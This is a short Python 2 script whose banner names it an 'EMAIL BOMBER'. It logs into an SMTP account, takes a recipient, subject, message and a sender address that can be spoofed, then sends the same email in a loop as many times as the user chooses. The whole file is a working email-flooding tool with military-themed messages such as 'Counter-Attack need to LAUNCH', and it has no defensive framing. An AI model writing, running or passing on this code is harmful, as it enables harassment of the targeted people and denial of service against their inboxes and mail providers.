import os
import smtplib
import sys
import time
from email.MIMEText import MIMEText  


class SMTP(object):
    def title(self):
        print '''
          #------------------------------#
          #       BUNGA LAUREL 1.0       #
          #         (EMAIL BOMBER)       #
          #    CREATOR: V0LT4G3_V1P3R    #
          #       PERSONAL USE ONLY      #
          #------------------------------#
                 [RECOMMENDED  INFO]
               SERVER: smtp.yandex.com
               PORT  : 587
''' 
   
    def SMTPconnect(self):
        print "ACCESSING COMMAND CENTER"
        self.smtpserver=raw_input("SMTP Server :")
        self.smtpport=raw_input("SMTP port (25/465/587(gmail)) :")
        try:
            self.mailServer = smtplib.SMTP(self.smtpserver,self.smtpport)
        except IOError, e:
               print "Invalid Server"


        self.mailServer.starttls()
        self.username=raw_input("Email : ")
        self.password=raw_input("Password : ")
        try:
             self.mailServer.login(self.username,self.password)
        except BaseException, e:
             print "Invalid Account"



    def EmailCreate(self):
        print "TERMINAL ACCESSED!"
        print "READY TO LAUNCH!"
        
        self.From = raw_input("From : ")
        self.To = raw_input("To: ")
        self.Subject = raw_input("Subject :")
        self.Message = raw_input("Message ")
        sending = MIMEText(self.Message)
        sending['From']=self.From
        sending['To']=self.To
        sending['Subject']=self.Subject
        self.amount = input("Counter-Attack need to LAUNCH: ")
        x = 0
        while x < self.amount:  
              self.mailServer.sendmail(self.From,self.To, sending.as_string())
              x+=1
        print "%d Team has been sent to secured %s" %(self.amount,self.To)
        time.sleep(7)
        print "Perimeter has been secured!"
        print "GOOD JOB!"

if __name__ == '__main__':
      s = SMTP()
      s.title()
      s.SMTPconnect()
s.EmailCreate()
